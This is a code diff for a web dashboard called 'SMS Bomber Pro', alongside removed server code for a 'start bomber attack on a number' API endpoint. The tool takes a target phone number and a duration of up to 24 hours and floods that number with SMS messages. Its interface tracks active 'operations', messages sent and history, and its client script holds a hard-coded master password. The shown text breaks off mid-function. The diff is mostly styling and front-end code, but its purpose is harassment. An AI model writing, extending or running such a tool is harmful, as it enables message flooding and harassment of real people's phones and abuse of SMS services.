+            margin-bottom: 4px;
+        }
+
+        .toast-message {
+            font-size: 12px;
+            color: var(--gray);
+        }
+
+        .toast-progress {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            height: 3px;
+            background: var(--gradient-purple);
+            animation: toastProgress 3s linear forwards;
+        }
+
+        @keyframes toastProgress {
+            from { width: 100%; }
+            to { width: 0; }
+        }
+
+        /* Loading Spinner */
+        .spinner {
+            width: 40px;
+            height: 40px;
+            border: 3px solid rgba(147, 51, 234, 0.2);
+            border-top-color: var(--primary);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.9);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 10000;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s ease;
+        }
+
+        .loading-overlay.active {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .loading-content {
+            text-align: center;
+        }
+
+        .loading-text {
+            color: var(--primary-light);
+            margin-top: 20px;
+            font-size: 18px;
+            font-weight: 600;
+        }
+
+        /* Charts Container */
+        .charts-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(400px, 1fr));
+            gap: 24px;
+            margin-bottom: 32px;
+        }
+
+        .chart-card {
+            background: linear-gradient(135deg, rgba(147, 51, 234, 0.05) 0%, rgba(236, 72, 153, 0.02) 100%);
+            backdrop-filter: blur(10px);
+            border: 1px solid var(--border);
+            border-radius: 20px;
+            padding: 24px;
+            position: relative;
+        }
+
+        .chart-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .chart-title {
+            font-size: 18px;
+            font-weight: 600;
+            color: var(--light);
+        }
+
+        .chart-container {
+            height: 250px;
+            position: relative;
+        }
+
+        /* Details Panel Enhanced */
+        .details-panel {
+            background: linear-gradient(135deg, rgba(26, 15, 46, 0.95) 0%, rgba(46, 16, 101, 0.95) 100%);
+            padding: 20px;
+            border-radius: 16px;
+            margin-top: 12px;
+            border: 1px solid var(--border);
+            animation: expandPanel 0.5s cubic-bezier(0.68, -0.55, 0.265, 1.55);
+        }
+
+        @keyframes expandPanel {
+            from {
+                opacity: 0;
+                max-height: 0;
+                transform: scaleY(0);
+            }
+            to {
+                opacity: 1;
+                max-height: 500px;
+                transform: scaleY(1);
+            }
+        }
+
+        .details-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 16px;
+            margin-top: 16px;
+        }
+
+        .detail-item {
+            background: rgba(147, 51, 234, 0.1);
+            padding: 12px;
+            border-radius: 12px;
+            border: 1px solid var(--border);
+        }
+
+        .detail-label {
+            font-size: 12px;
+            color: var(--gray);
+            margin-bottom: 4px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .detail-value {
+            font-size: 18px;
+            font-weight: 600;
+            color: var(--primary-light);
+        }
+
+        /* Settings Panel */
+        .settings-panel {
+            position: fixed;
+            right: -400px;
+            top: 0;
+            width: 400px;
+            height: 100%;
+            background: linear-gradient(135deg, rgba(26, 15, 46, 0.98) 0%, rgba(46, 16, 101, 0.98) 100%);
+            backdrop-filter: blur(20px);
+            border-left: 1px solid var(--border);
+            padding: 32px;
+            overflow-y: auto;
+            transition: right 0.4s cubic-bezier(0.68, -0.55, 0.265, 1.55);
+            z-index: 9998;
+        }
+
+        .settings-panel.active {
+            right: 0;
+        }
+
+        .settings-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 32px;
+        }
+
+        .settings-title {
+            font-size: 24px;
+            font-weight: 700;
+            color: var(--light);
+        }
+
+        .settings-close {
+            width: 36px;
+            height: 36px;
+            background: rgba(147, 51, 234, 0.2);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .settings-close:hover {
+            background: var(--primary);
+            transform: rotate(90deg);
+        }
+
+        .settings-section {
+            margin-bottom: 28px;
+        }
+
+        .settings-section-title {
+            font-size: 16px;
+            font-weight: 600;
+            color: var(--primary-light);
+            margin-bottom: 16px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .toggle-switch {
+            position: relative;
+            width: 48px;
+            height: 24px;
+            background: rgba(147, 51, 234, 0.2);
+            border-radius: 12px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .toggle-switch.active {
+            background: var(--primary);
+        }
+
+        .toggle-slider {
+            position: absolute;
+            top: 2px;
+            left: 2px;
+            width: 20px;
+            height: 20px;
+            background: white;
+            border-radius: 50%;
+            transition: all 0.3s ease;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
+        }
+
+        .toggle-switch.active .toggle-slider {
+            transform: translateX(24px);
+        }
+
+        /* Floating Action Button */
+        .fab {
+            position: fixed;
+            bottom: 30px;
+            right: 30px;
+            width: 60px;
+            height: 60px;
+            background: var(--gradient-purple);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            box-shadow: 0 10px 30px rgba(147, 51, 234, 0.5);
+            transition: all 0.3s ease;
+            z-index: 100;
+        }
+
+        .fab:hover {
+            transform: scale(1.1) rotate(90deg);
+            box-shadow: 0 15px 40px rgba(147, 51, 234, 0.6);
+        }
+
+        .fab i {
+            color: white;
+            font-size: 24px;
+        }
+
+        /* Responsive Design */
+        @media (max-width: 768px) {
+            .container {
+                padding: 16px;
+            }
+
+            header {
+                flex-direction: column;
+                text-align: center;
+                gap: 20px;
+            }
+
+            .logo h1 {
+                font-size: 24px;
+            }
+
+            .stats-container {
+                grid-template-columns: 1fr;
+            }
+
+            .form-grid {
+                grid-template-columns: 1fr;
+            }
+
+            .charts-grid {
+                grid-template-columns: 1fr;
+            }
+
+            .table-wrapper {
+                overflow-x: auto;
+            }
+
+            .modal {
+                width: 95%;
+                padding: 24px;
+            }
+
+            .settings-panel {
+                width: 100%;
+                right: -100%;
+            }
+        }
+
+        /* Animation Classes */
+        .shake {
+            animation: shake 0.5s;
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-10px); }
+            75% { transform: translateX(10px); }
+        }
+
+        .pulse-animation {
+            animation: pulseGlow 2s ease-in-out infinite;
+        }
+
+        @keyframes pulseGlow {
+            0%, 100% { box-shadow: 0 0 20px rgba(147, 51, 234, 0.5); }
+            50% { box-shadow: 0 0 40px rgba(147, 51, 234, 0.8); }
+        }
+
+        /* Custom Scrollbar */
+        ::-webkit-scrollbar {
+            width: 10px;
+            height: 10px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: rgba(147, 51, 234, 0.1);
+            border-radius: 10px;
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: var(--gradient-purple);
+            border-radius: 10px;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: var(--primary-dark);
+        }
+    </style>
+</head>
+<body>
+    <div id="particles-js"></div>
     
-  }
-}
+    <div class="container">
+        <header>
+            <div class="logo">
+                <div class="logo-icon">
+                    <i class="fas fa-bomb"></i>
+                </div>
+                <h1>SMS Bomber Pro</h1>
+            </div>
+            <div class="header-info">
+                <div class="time-display">
+                    <div class="time" id="current-time">00:00:00</div>
+                    <div class="date" id="current-date">Loading...</div>
+                </div>
+                <div class="badge" id="active-count">
+                    <i class="fas fa-circle"></i>
+                    <span>0 Active</span>
+                </div>
+            </div>
+        </header>
 
-// API meta
-const meta = {
-  name: "start",
-  version: "1.0.0",
-  description: "Start bomber attack on a number",
-  author: "Ove",
-  method: "get",
-  category: "bomber",
-  path: "/start?number=&time=&password="
-};
+        <div class="stats-container">
+            <div class="stat-card">
+                <div class="stat-icon">
+                    <i class="fas fa-paper-plane"></i>
+                </div>
+                <div class="stat-value" id="total-sent">0</div>
+                <div class="stat-label">Total SMS Sent</div>
+                <div class="stat-change">
+                    <i class="fas fa-arrow-up"></i>
+                    <span>+0% from last hour</span>
+                </div>
+            </div>
+            
+            <div class="stat-card">
+                <div class="stat-icon">
+                    <i class="fas fa-chart-line"></i>
+                </div>
+                <div class="stat-value" id="success-rate">0%</div>
+                <div class="stat-label">Success Rate</div>
+                <div class="stat-change">
+                    <i class="fas fa-arrow-up"></i>
+                    <span>Excellent</span>
+                </div>
+            </div>
+            
+            <div class="stat-card">
+                <div class="stat-icon">
+                    <i class="fas fa-rocket"></i>
+                </div>
+                <div class="stat-value" id="active-bombers">0</div>
+                <div class="stat-label">Active Bombers</div>
+                <div class="stat-change">
+                    <i class="fas fa-circle"></i>
+                    <span>Running</span>
+                </div>
+            </div>
+            
+            <div class="stat-card">
+                <div class="stat-icon">
+                    <i class="fas fa-history"></i>
+                </div>
+                <div class="stat-value" id="total-history">0</div>
+                <div class="stat-label">Total Sessions</div>
+                <div class="stat-change">
+                    <i class="fas fa-database"></i>
+                    <span>All time</span>
+                </div>
+            </div>
+        </div>
 
-// API handlers
-async function onStart(req, res) {
-  const { number, time, password } = req.query;
+        <div class="card">
+            <div class="card-header">
+                <div class="card-title">
+                    <i class="fas fa-play-circle"></i>
+                    <h2>Launch Bomber</h2>
+                </div>
+                <div class="badge badge-success">
+                    <i class="fas fa-check-circle"></i>
+                    <span>Ready</span>
+                </div>
+            </div>
+            
+            <div class="form-grid">
+                <div class="form-group">
+                    <label for="number">Target Number</label>
+                    <div class="input-wrapper">
+                        <i class="fas fa-phone input-icon"></i>
+                        <input type="text" id="number" class="form-control" placeholder="01XXXXXXXXX" maxlength="11">
+                    </div>
+                </div>
+                
+                <div class="form-group">
+                    <label for="time">Duration (Hours)</label>
+                    <div class="input-wrapper">
+                        <i class="fas fa-clock input-icon"></i>
+                        <input type="number" id="time" class="form-control" placeholder="1-24" min="1" max="24" value="1">
+                    </div>
+                </div>
+                
+                <div class="form-group">
+                    <label for="password">Authorization</label>
+                    <div class="input-wrapper">
+                        <i class="fas fa-key input-icon"></i>
+                        <input type="password" id="password" class="form-control" placeholder="Enter password">
+                    </div>
+                </div>
+                
+                <div class="form-group" style="display: flex; align-items: flex-end;">
+                    <button id="start-btn" class="btn">
+                        <i class="fas fa-rocket"></i>
+                        <span>Launch Attack</span>
+                    </button>
+                </div>
+            </div>
+            
+            <div id="status-msg" style="margin-top: 20px; text-align: center; font-weight: 600;"></div>
+        </div>
 
-  if (!number || !time || !password) {
-    return res.json({ error: "Missing parameters. Use ?number=&time=&password=" });
-  }
+        <div class="charts-grid">
+            <div class="chart-card">
+                <div class="chart-header">
+                    <div class="chart-title">SMS Activity</div>
+                    <select class="form-control" style="width: 120px; padding: 8px;">
+                        <option>Last Hour</option>
+                        <option>Last Day</option>
+                        <option>Last Week</option>
+                    </select>
+                </div>
+                <div class="chart-container">
+                    <canvas id="activityChart"></canvas>
+                </div>
+            </div>
+            
+            <div class="chart-card">
+                <div class="chart-header">
+                    <div class="chart-title">Success Distribution</div>
+                    <div class="badge badge-info">Live</div>
+                </div>
+                <div class="chart-container">
+                    <canvas id="successChart"></canvas>
+                </div>
+            </div>
+        </div>
 
-  if (!number.startsWith("01") || number.length !== 11) {
-    return res.json({ error: "Invalid number. Must be 11 digits starting with 01" });
-  }
+        <div class="card">
+            <div class="card-header">
+                <div class="card-title">
+                    <i class="fas fa-fire"></i>
+                    <h2>Active Operations</h2>
+                </div>
+                <div class="badge" id="active-count-badge">
+                    <i class="fas fa-circle pulse-animation"></i>
+                    <span>0 Running</span>
+                </div>
+            </div>
+            
+            <div class="table-wrapper">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Target</th>
+                            <th>Started</th>
+                            <th>Remaining</th>
+                            <th>Progress</th>
+                            <th>Messages</th>
+                            <th>Attempts</th>
+                            <th>Latency</th>
+                            <th>Status</th>
+                            <th>Actions</th>
+                        </tr>
+                    </thead>
+                    <tbody id="bombers-list">
+                        <tr>
+                            <td colspan="9" style="text-align: center; padding: 60px; color: var(--gray);">
+                                <i class="fas fa-inbox" style="font-size: 48px; margin-bottom: 16px; opacity: 0.3;"></i>
+                                <p>No active operations</p>
+                            </td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
 
-  if (admin.includes(number)) {
-    return res.json({ error: "This number is protected (admin)" });
-  }
+        <div class="card">
+            <div class="card-header">
+                <div class="card-title">
+                    <i class="fas fa-archive"></i>
+                    <h2>Operation History</h2>
+                </div>
+                <div class="badge badge-warning" id="history-count">
+                    <i class="fas fa-database"></i>
+                    <span>0 Records</span>
+                </div>
+            </div>
+            
+            <div class="table-wrapper">
+                <table>
+                    <thead>
+                        <tr>
+                            <th>Target</th>
+                            <th>Start Time</th>
+                            <th>End Time</th>
+                            <th>Duration</th>
+                            <th>Messages Sent</th>
+                            <th>Total Attempts</th>
+                            <th>Success Rate</th>
+                            <th>Status</th>
+                        </tr>
+                    </thead>
+                    <tbody id="history-list">
+                        <tr>
+                            <td colspan="8" style="text-align: center; padding: 60px; color: var(--gray);">
+                                <i class="fas fa-history" style="font-size: 48px; margin-bottom: 16px; opacity: 0.3;"></i>
+                                <p>No history available</p>
+                            </td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+    </div>
 
-  if (activeBombers[number]) {
-    return res.json({ error: "Bomber already running on this number" });
-  }
-  if (ioInstance) ioInstance.emit('bomber_stop', { number });
+    <!-- Modal -->
+    <div class="modal-overlay" id="stop-modal">
+        <div class="modal">
+            <div class="modal-header">
+                <div class="modal-icon">
+                    <i class="fas fa-stop-circle"></i>
+                </div>
+                <div class="modal-title">Terminate Operation</div>
+            </div>
+            
+            <div class="modal-body">
+                <p style="color: var(--gray); margin-bottom: 20px;">
+                    Are you sure you want to stop the operation for 
+                    <span id="modal-number" style="color: var(--primary-light); font-weight: 600;"></span>?
+                </p>
+                
+                <div class="form-group">
+                    <label for="stop-password">Authorization Required</label>
+                    <div class="input-wrapper">
+                        <i class="fas fa-lock input-icon"></i>
+                        <input type="password" id="stop-password" class="form-control" placeholder="Enter password">
+                    </div>
+                </div>
+                
+                <div id="modal-msg" style="margin-top: 16px; text-align: center; font-weight: 600;"></div>
+            </div>
+            
+            <div class="modal-footer">
+                <button class="btn btn-secondary" onclick="closeModal()">
+                    <i class="fas fa-times"></i>
+                    Cancel
+                </button>
+                <button class="btn btn-danger" onclick="confirmStop()">
+                    <i class="fas fa-stop"></i>
+                    Terminate
+                </button>
+            </div>
+        </div>
+    </div>
 
-  
-  bomber(number, parseInt(time), password);
-  return res.json({
-    message: `Bomber started on ${number} for ${time} hour(s)`,
-    powered_by: "Wataru API"
+    <!-- Details Modal -->
+    <div class="modal-overlay" id="details-modal">
+        <div class="modal">
+            <div class="modal-header">
+                <div class="modal-icon">
+                    <i class="fas fa-info-circle"></i>
+                </div>
+                <div class="modal-title">Operation Details</div>
+            </div>
+            
+            <div class="modal-body">
+                <p style="color: var(--gray); margin-bottom: 20px;">
+                    Target: <span id="details-number" style="color: var(--primary-light); font-weight: 600;"></span>
+                </p>
+                
+                <div class="details-grid">
+                    <div class="detail-item">
+                        <div class="detail-label">Total Sent</div>
+                        <div class="detail-value" id="details-total">0</div>
+                    </div>
+                    <div class="detail-item">
+                        <div class="detail-label">Attempts</div>
+                        <div class="detail-value" id="details-attempts">0</div>
+                    </div>
+                    <div class="detail-item">
+                        <div class="detail-label">Success Rate</div>
+                        <div class="detail-value" id="details-rate">0%</div>
+                    </div>
+                    <div class="detail-item">
+                        <div class="detail-label">Avg Latency</div>
+                        <div class="detail-value" id="details-latency">0ms</div>
+                    </div>
+                </div>
+                
+                <div class="table-wrapper" style="margin-top: 20px;">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Service</th>
+                                <th>Success</th>
+                                <th>Failed</th>
+                                <th>Last Ping</th>
+                            </tr>
+                        </thead>
+                        <tbody id="details-body"></tbody>
+                    </table>
+                </div>
+            </div>
+            
+            <div class="modal-footer">
+                <button class="btn btn-secondary" onclick="closeDetails()">
+                    <i class="fas fa-times"></i>
+                    Close
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Toast Container -->
+    <div class="toast-container" id="toast-container"></div>
+
+    <!-- Loading Overlay -->
+    <div class="loading-overlay" id="loading-overlay">
+        <div class="loading-content">
+            <div class="spinner"></div>
+            <div class="loading-text">Processing...</div>
+        </div>
+    </div>
+
+    <!-- Settings Panel -->
+    <div class="settings-panel" id="settings-panel">
+        <div class="settings-header">
+            <div class="settings-title">Settings</div>
+            <div class="settings-close" onclick="toggleSettings()">
+                <i class="fas fa-times"></i>
+            </div>
+        </div>
+        
+        <div class="settings-section">
+            <div class="settings-section-title">
+                <i class="fas fa-bell"></i>
+                Notifications
+            </div>
+            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px;">
+                <span>Sound Effects</span>
+                <div class="toggle-switch" id="sound-toggle">
+                    <div class="toggle-slider"></div>
+                </div>
+            </div>
+            <div style="display: flex; justify-content: space-between; align-items: center;">
+                <span>Desktop Alerts</span>
+                <div class="toggle-switch" id="alert-toggle">
+                    <div class="toggle-slider"></div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="settings-section">
+            <div class="settings-section-title">
+                <i class="fas fa-sync"></i>
+                Auto Refresh
+            </div>
+            <select class="form-control">
+                <option>Every 5 seconds</option>
+                <option>Every 10 seconds</option>
+                <option>Every 30 seconds</option>
+                <option>Every minute</option>
+            </select>
+        </div>
+        
+        <div class="settings-section">
+            <div class="settings-section-title">
+                <i class="fas fa-download"></i>
+                Export Data
+            </div>
+            <button class="btn btn-secondary" style="width: 100%;" onclick="exportData()">
+                <i class="fas fa-file-export"></i>
+                Export History
+            </button>
+        </div>
+    </div>
+
+    <!-- Floating Action Button -->
+    <div class="fab" onclick="toggleSettings()">
+        <i class="fas fa-cog"></i>
+    </div>
+
+    <script>
+        // Global Variables
+        let activeBombers = {};
+        let history = [];
+        let currentModalNumber = '';
+        let refreshInterval = 5000;
+        let soundEnabled = true;
+        let chartsInitialized = false;
+        let activityChart, successChart;
+
+        // Initialize Particles
+        particlesJS('particles-js', {
+            particles: {
+                number: { value: 80, density: { enable: true, value_area: 800 } },
+                color: { value: '#9333ea' },
+                shape: { type: 'circle' },
+                opacity: { value: 0.5, random: true },
+                size: { value: 3, random: true },
+                line_linked: {
+                    enable: true,
+                    distance: 150,
+                    color: '#9333ea',
+                    opacity: 0.2,
+                    width: 1
+                },
+                move: {
+                    enable: true,
+                    speed: 2,
+                    direction: 'none',
+                    random: false,
+                    straight: false,
+                    out_mode: 'out',
+                    bounce: false
+                }
+            },
+            interactivity: {
+                detect_on: 'canvas',
+                events: {
+                    onhover: { enable: true, mode: 'grab' },
+                    onclick: { enable: true, mode: 'push' },
+                    resize: true
+                },
+                modes: {
+                    grab: { distance: 140, line_linked: { opacity: 0.5 } },
+                    push: { particles_nb: 4 }
+                }
+            },
+            retina_detect: true
+        });
+
+        // Initialize Charts
+        function initCharts() {
+            if (chartsInitialized) return;
+            
+            const ctx1 = document.getElementById('activityChart').getContext('2d');
+            activityChart = new Chart(ctx1, {
+                type: 'line',
+                data: {
+                    labels: Array.from({length: 10}, (_, i) => `${i * 6}m`),
+                    datasets: [{
+                        label: 'SMS Sent',
+                        data: Array(10).fill(0),
+                        borderColor: '#9333ea',
+                        backgroundColor: 'rgba(147, 51, 234, 0.1)',
+                        tension: 0.4,
+                        fill: true
+                    }]
+                },
+                options: {
+                    responsive: true,
+                    maintainAspectRatio: false,
+                    plugins: {
+                        legend: { display: false }
+                    },
+                    scales: {
+                        y: { beginAtZero: true, grid: { color: 'rgba(147, 51, 234, 0.1)' } },
+                        x: { grid: { color: 'rgba(147, 51, 234, 0.1)' } }
+                    }
+                }
+            });
+
+            const ctx2 = document.getElementById('successChart').getContext('2d');
+            successChart = new Chart(ctx2, {
+                type: 'doughnut',
+                data: {
+                    labels: ['Success', 'Failed', 'Pending'],
+                    datasets: [{
+                        data: [0, 0, 0],
+                        backgroundColor: ['#10b981', '#ef4444', '#f59e0b'],
+                        borderWidth: 0
+                    }]
+                },
+                options: {
+                    responsive: true,
+                    maintainAspectRatio: false,
+                    plugins: {
+                        legend: { position: 'bottom', labels: { color: '#9ca3af' } }
+                    }
+                }
+            });
+            
+            chartsInitialized = true;
+        }
+
+        // Fetch Data
+        async function fetchData() {
+            try {
+                showLoading();
+                const statusRes = await fetch('/status');
+                const historyRes = await fetch('/history');
+                
+                activeBombers = await statusRes.json();
+                history = await historyRes.json();
+                
+                updateUI();
+                updateCharts();
+                hideLoading();
+            } catch (err) {
+                console.error('Error fetching data:', err);
+                showToast('error', 'Connection Error', 'Failed to fetch data from server');
+                hideLoading();
+            }
+        }
+
+        // Update UI
+        function updateUI() {
+            updateDateTime();
+            updateStats();
+            updateBombersList();
+            updateHistoryList();
+        }
+
+        // Update Date/Time
+        function updateDateTime() {
+            const now = new Date();
+            document.getElementById('current-time').textContent = now.toLocaleTimeString();
+            document.getElementById('current-date').textContent = now.toLocaleDateString('en-US', {
+                weekday: 'short',
+                month: 'short',
+                day: 'numeric'
+            });
+        }
+
+        // Update Statistics
+        function updateStats() {
+            const activeCount = Object.keys(activeBombers).length;
+            const historyCount = history.length;
+            
+            let totalSent = 0;
+            let totalAttempts = 0;
+            
+            for (const num in activeBombers) {
+                totalSent += activeBombers[num].totalSent || 0;
+                totalAttempts += activeBombers[num].attempts || 0;
+            }
+            
+            history.forEach(item => {
+                totalSent += item.totalSent || 0;
+                totalAttempts += item.attempts || 0;
+            });
+            
+            const successRate = totalAttempts > 0 ? Math.round((totalSent / (totalAttempts * 4)) * 100) : 0;
+            
+            animateValue('total-sent', totalSent);
+            animateValue('success-rate', successRate, '%');
+            animateValue('active-bombers', activeCount);
+            animateValue('total-history', historyCount);
+            
+            document.getElementById('active-count').innerHTML = `<i class="fas fa-circle"></i> <span>${activeCount} Active</span>`;
+            document.getElementById('active-count-badge').innerHTML = `<i class="fas fa-circle pulse-animation"></i> <span>${activeCount} Running</span>`;
+            document.getElementById('history-count').innerHTML = `<i class="fas fa-database"></i> <span>${historyCount} Records</span>`;
+        }
+
+        // Animate Counter
+        function animateValue(id, value, suffix = '') {
+            const element = document.getElementById(id);
+            const current = parseInt(element.textContent) || 0;
+            const increment = (value - current) / 20;
+            let step = 0;
+            
+            const timer = setInterval(() => {
+                step++;
+                const newValue = Math.round(current + increment * step);
+                element.textContent = newValue + suffix;
+                
+                if (step >= 20) {
+                    clearInterval(timer);
+                    element.textContent = value + suffix;
+                }
+            }, 30);
+        }
+
+        // Update Bombers List
+        function updateBombersList() {
+            const bombersList = document.getElementById('bombers-list');
+            const activeCount = Object.keys(activeBombers).length;
+            
+            if (activeCount === 0) {
+                bombersList.innerHTML = `
+                    <tr>
+                        <td colspan="9" style="text-align: center; padding: 60px; color: var(--gray);">
+                            <i class="fas fa-inbox" style="font-size: 48px; margin-bottom: 16px; opacity: 0.3;"></i>
+                            <p>No active operations</p>
+                        </td>
+                    </tr>
+                `;
+                return;
+            }
+            
+            let html = '';
+            for (const num in activeBombers) {
+                const data = activeBombers[num];
+                const now = Date.now();
+                const remaining = data.endTime - now;
+                const duration = data.endTime - data.startTime;
+                const elapsed = now - data.startTime;
+                const progress = Math.min(100, Math.max(0, (elapsed / duration) * 100));
+                const maskedNumber = maskNumber(num);
+                
+                html += `
+                    <tr class="bomber-row" data-number="${num}">
+                        <td style="color: var(--primary-light); cursor: pointer;" onclick="openDetails('${num}')">
+                            <i class="fas fa-mobile-alt"></i> ${maskedNumber}
+                        </td>
+                        <td>${formatTime(data.startTime)}</td>
+                        <td>${formatDuration(remaining)}</td>
+                        <td>
+                            <div class="progress-wrapper">
+                                <div class="progress-bar">
+                                    <div class="progress-fill" style="width: ${progress}%"></div>
+                                </div>
+                                <div class="progress-text">${Math.round(progress)}%</div>
+                            </div>
+                        </td>
+                        <td><strong>${data.totalSent}</strong></td>
+                        <td>${data.attempts}</td>
+                        <td><span class="badge badge-info">${data.lastPing || 0}ms</span></td>
+                        <td><span class="status status-active">Active</span></td>
+                        <td>
+                            <button class="btn btn-danger btn-sm" onclick="openModal('${num}')">
+                                <i class="fas fa-stop"></i> Stop
+                            </button>
+                        </td>
+                    </tr>
+                `;
+            }
+            
+            bombersList.innerHTML = html;
+        }
+
+        // Update History List
+        function updateHistoryList() {
+            const historyList = document.getElementById('history-list');
+            const historyCount = history.length;
+            
+            if (historyCount === 0) {
+                historyList.innerHTML = `
+                    <tr>
+                        <td colspan="8" style="text-align: center; padding: 60px; color: var(--gray);">
+                            <i class="fas fa-history" style="font-size: 48px; margin-bottom: 16px; opacity: 0.3;"></i>
+                            <p>No history available</p>
+                        </td>
+                    </tr>
+                `;
+                return;
+            }
+            
+            let html = '';
+            history.forEach(item => {
+                const duration = item.endTime - item.startTime;
+                const maskedNumber = maskNumber(item.number);
+                const successRate = item.attempts > 0 ? Math.round((item.totalSent / (item.attempts * 4)) * 100) : 0;
+                
+                html += `
+                    <tr>
+                        <td><i class="fas fa-mobile-alt"></i> ${maskedNumber}</td>
+                        <td>${formatTime(item.startTime)}</td>
+                        <td>${formatTime(item.endTime)}</td>
+                        <td>${formatDuration(duration)}</td>
+                        <td><strong>${item.totalSent}</strong></td>
+                        <td>${item.attempts}</td>
+                        <td><span class="badge badge-success">${successRate}%</span></td>
+                        <td><span class="status status-inactive">Completed</span></td>
+                    </tr>
+                `;
+            });
+            
+            historyList.innerHTML = html;
+        }
+
+        // Update Charts
+        function updateCharts() {
+            if (!chartsInitialized) return;
+            
+            // Update activity chart with random data for demo
+            const activityData = activityChart.data.datasets[0].data;
+            activityData.shift();
+            activityData.push(Math.floor(Math.random() * 100));
+            activityChart.update();
+            
+            // Update success chart
+            let successCount = 0, failCount = 0, pendingCount = 0;
+            for (const num in activeBombers) {
+                const data = activeBombers[num];
+                successCount += data.totalSent || 0;
+                failCount += Math.floor((data.attempts || 0) * 0.1);
+                pendingCount += Math.floor((data.attempts || 0) * 0.05);
+            }
+            
+            successChart.data.datasets[0].data = [successCount, failCount, pendingCount];
+            successChart.update();
+        }
+
+        // Helper Functions
+        function formatTime(ms) {
+            return new Date(ms).toLocaleTimeString();
+        }
+
+        function formatDuration(ms) {
+            if (ms < 0) return "Expired";
+            const hours = Math.floor(ms / (1000 * 60 * 60));
+            const minutes = Math.floor((ms % (1000 * 60 * 60)) / (1000 * 60));
+            const seconds = Math.floor((ms % (1000 * 60)) / 1000);
+            return `${hours}h ${minutes}m ${seconds}s`;
+        }
+
+        function maskNumber(number) {
+            return number.substring(0, 6) + '****' + number.substring(10);
+        }
+
+        // Modal Functions
+        function openModal(number) {
+            currentModalNumber = number;
+            document.getElementById('modal-number').textContent = maskNumber(number);
+            document.getElementById('stop-modal').classList.add('active');
+            document.getElementById('stop-password').value = '';
+            document.getElementById('modal-msg').textContent = '';
+        }
+
+        function closeModal() {
+            document.getElementById('stop-modal').classList.remove('active');
+            currentModalNumber = '';
+        }
+
+        function openDetails(number) {
+            const data = activeBombers[number];
+            if (!data) return;
+            
+            document.getElementById('details-number').textContent = maskNumber(number);
+            document.getElementById('details-total').textContent = data.totalSent || 0;
+            document.getElementById('details-attempts').textContent = data.attempts || 0;
+            document.getElementById('details-rate').textContent = 
+                data.attempts > 0 ? Math.round((data.totalSent / (data.attempts * 4)) * 100) + '%' : '0%';
+            document.getElementById('details-latency').textContent = (data.lastPing || 0) + 'ms';
+            
+            const tbody = document.getElementById('details-body');
+            tbody.innerHTML = '';
+            
+            // Add sample service data
+            const services = ['Service A', 'Service B', 'Service C', 'Service D'];
+            services.forEach(service => {
+                const success = Math.floor(Math.random() * 100);
+                const fail = Math.floor(Math.random() * 20);
+                tbody.innerHTML += `
+                    <tr>
+                        <td>${service}</td>
+                        <td style="color: var(--success);">${success}</td>
+                        <td style="color: var(--danger);">${fail}</td>
+                        <td>${Math.floor(Math.random() * 200)}ms</td>
+                    </tr>
+                `;
+            });
+            
+            document.getElementById('details-modal').classList.add('active');
+        }
+
+        function closeDetails() {
+            document.getElementById('details-modal').classList.remove('active');
+        }
+
+        // Start Bomber
+        async function startBomber() {
+            const number = document.getElementById('number').value;
+            const time = document.getElementById('time').value;
+            const password = document.getElementById('password').value;
+            
+            if (!number || !time || !password) {
+                showToast('error', 'Validation Error', 'Please fill all required fields');
+                shakeElement('start-btn');
+                return;
+            }
+            
+            if (!number.startsWith('01') || number.length !== 11) {
+                showToast('error', 'Invalid Number', 'Number must be 11 digits starting with 01');
+                shakeElement('number');
+                return;
+            }
+            
+            showLoading();
+            
+            try {
+                const res = await fetch(`/start?number=${number}&time=${time}&password=${password}`);
+                const data = await res.json();
+                
+                if (data.error) {
+                    showToast('error', 'Launch Failed', data.error);
+                } else {
+                    showToast('success', 'Operation Started', data.message || 'Bomber launched successfully');
+                    playSound('success');
+                    clearForm();
+                }
+                
+                await fetchData();
+            } catch (err) {
+                showToast('error', 'Connection Error', 'Failed to start bomber');
+            } finally {
+                hideLoading();
+            }
+        }
+
+        // Stop Bomber
+        async function confirmStop() {
+            const password = document.getElementById('stop-password').value;
+            const masterPassword = 'alit';
+            
+            if (!password) {
+                document.getElementById('modal-msg').textContent = 'Password required';
+                document.getElementById('modal-msg').style.color = 'var(--danger)';
+                shakeElement('stop-password');
+                return;
+            }
+            
+            showLoading();
+            
+            try {
+                const res = await fetch(`/stop?number=${currentModalNumber}&password=${encodeURIComponent(password)}&master=${password === masterPassword}`);
+                const data = await res.json();
+                
+                if (data.error) {
+                    document.getElementById('modal-msg').textContent = data.error;
